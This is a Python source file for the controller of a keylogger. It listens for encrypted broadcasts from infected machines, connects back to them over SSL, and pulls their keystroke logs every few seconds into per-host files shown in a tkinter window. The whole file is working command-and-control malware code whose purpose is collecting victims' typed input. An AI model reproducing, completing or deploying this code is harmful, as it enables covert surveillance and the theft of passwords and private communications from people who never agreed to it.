from socket import *
from time import sleep
from threading import Thread
from constants import *
from utils import Event, set_keepalive, send_msg, recv_msg
import ssl
import sys
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from multiprocessing.pool import ThreadPool
import tkinter as tk
from ui import Application


def fetch_file(host, on_file_fetched, update_hosts):
    """
    Fetch the keylog from a specified connected host

    Args:
        host: the IP of the host
        on_file_fetched: callback after fetching the file
        update_hosts: function to call to refresh the ui of the hosts in case the host disconnected
    """
    global hosts
    if host not in hosts.keys():
        return
    conn = hosts[host]
    try:
        send_msg(conn, "send file")
        file = recv_msg(conn)
        with open(host + ".log", "a", encoding="utf-8") as f:
            f.write(file)
        on_file_fetched(Event(host=host, file=file))
    except (timeout, error):
        conn.close()
        del hosts[host]
        update_hosts(Event(hosts=hosts.keys()))


def fetch_files(on_file_fetched, get_fetch_interval, update_hosts):
    """
    Fetches the keylogs from all connected hosts

    Args:
        on_file_fetched: callback after fetching the file
        get_fetch_interval: function to retriebe the specified interbal in the UI
        update_hosts: function to call to refresh the ui of the hosts in case the host disconnected
    """
    global hosts, pool
    while True:
        pool.map(lambda host: fetch_file(
            host, on_file_fetched, update_hosts), hosts.keys())
        sleep(get_fetch_interval())


def listen_to_hosts(update_hosts):
    """
    Listens for broadcasts made by clients and connects to them using its pribate key.

    Args:
        update_hosts: function to call to refresh the ui when connected to a new host
    """
    global HOST_PORT, BD_PORT, cipher_rsa
    BDlistener = socket(AF_INET, SOCK_DGRAM)
    BDlistener.bind(("", BD_PORT))
    while True:
        data, addr = BDlistener.recvfrom(4096)
        ip = addr[0]
        decryptedData = cipher_rsa.decrypt(data).decode()
        if decryptedData != ip:
            continue
        if ip in hosts.keys():
            continue
        conn = socket(AF_INET, SOCK_STREAM)
        set_keepalive(conn)
        try:
            conn.connect((ip, HOST_PORT))
            conn = ssl.wrap_socket(
                sock=conn, certfile=CERT_FILE, keyfile=PRIVATE_KEY_FILE, server_side=True)
            hosts[ip] = conn
            update_hosts(Event(hosts=hosts.keys()))
        except:
            conn.close()
    BDlistener.close()


if __name__ == "__main__":
    if getattr(sys, 'frozen', False):
        CERT_FILE = sys._MEIPASS + "/cert.pem"
        PRIVATE_KEY_FILE = sys._MEIPASS + "/key.pem"
    else:
        CERT_FILE = "src/cert.pem"
        PRIVATE_KEY_FILE = "src/key.pem"
    FETCH_INTERVAL = 5
    THREADS = 32

    private_key = RSA.import_key(open(PRIVATE_KEY_FILE).read())
    cipher_rsa = PKCS1_OAEP.new(private_key)
    hosts = {}
    pool = ThreadPool(processes=THREADS)

    root = tk.Tk()
    root.title("controller")
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    root.geometry("1100x550")
    app = Application(root, fetch_file, padding="5")
    Thread(target=fetch_files, args=(app.on_file_fetched,
                                     app.get_interval, app.update_hosts)).start()
    Thread(target=listen_to_hosts, args=(app.update_hosts,)).start()
    app.grid(column=0, row=0, sticky=tk.N +
             tk.S + tk.E + tk.W)
    root.mainloop()
